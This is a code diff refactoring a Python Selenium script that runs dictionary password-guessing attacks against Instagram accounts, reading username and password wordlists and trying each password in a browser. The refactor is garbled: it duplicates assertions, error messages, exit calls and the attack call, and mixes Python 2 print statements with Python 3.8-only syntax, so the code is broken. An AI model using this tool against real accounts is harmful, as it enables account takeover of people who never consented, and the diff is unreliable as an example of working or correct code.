@@ -13,7 +13,8 @@ driver = "reserved"
 
 def userExists(username):
 	try:
-		driver.get("https://instagram.com/"+username)
+		driver.get(f"https://instagram.com/{username}")
+		assert (("Page Not Found" or "no encontrada") not in driver.title)
 		assert (("Page Not Found" or "no encontrada") not in driver.title)
 	except AssertionError:
 		print 'user: "%s" does not exist, trying with the next!' %username
@@ -84,16 +85,18 @@ def main():
 
 	global driver
 
-	if (options.delay is None):
-		delay = 2
-	else:
-		delay = int(options.delay)
+	delay = 2 if (options.delay is None) else int(options.delay)
+	parser = optparse.OptionParser()
 	print 'Using %d seconds of delay' %delay 
 
 	if ( (options.userfile == False) and (options.username == False) ) :
 		print 'You have to set an username or a userfile'
 		exit()
+		print 'You have to set an username or a userfile'
+		exit()
 	if ( (options.userfile != False) and (options.username != False) ) :
+		print 'You can\'t set both options at once.. choose between username or userfile'
+		exit()
 		print 'You can\'t set both options at once.. choose between username or userfile'
 		exit()
 	if (options.dictionary == False):
@@ -101,42 +104,47 @@ def main():
 		exit()
 
 	try:
-		f = open(options.dictionary,'r')
-		passwords = []
-		
-		while True:
-			line = f.readline()
-			if not line:
-				break
+		with open(options.dictionary,'r') as f:
+			passwords = []
+
+			while True:
+				if line := f.readline():
+					passwords.append(line.strip('\n'))
+				else:
+					break
 			passwords.append(line.strip('\n'))
 		f.close()
 	except:
 		print 'Check the path to the dictionary and try again'
 		exit()
-	
+
 	if (options.userfile != False):
 		try:
-			f = open(options.userfile,'r')
-			usernames = []
-			
-			while True:
-				line = f.readline()
-				if not line:
-					break
+			with open(options.userfile,'r') as f:
+				usernames = []
+
+				while True:
+					if line := f.readline():
+						usernames.append(line.strip('\n'))
+					else:
+						break
 				usernames.append(line.strip('\n'))
 			f.close()
 		except:
 			print 'Check the path to the users file and try again'
 			exit()
-        	
-        	driver = webdriver.Firefox(profile)
-        	driver.implicitly_wait(30)
+
+		driver = webdriver.Firefox(profile)
+		driver.implicitly_wait(30)
 		dictionaryAttack(usernames,passwords,delay)
 	else:
-       		driver = webdriver.Firefox(profile)
-	        driver.implicitly_wait(30)
+		driver = webdriver.Firefox(profile)
+		driver.implicitly_wait(30)
 		dictionaryAttack(options.username,passwords,delay)
-	
+
+	driver.implicitly_wait(30)
+	dictionaryAttack(options.username,passwords,delay)
+
 	driver.close()
 if __name__ == '__main__':
 	main()
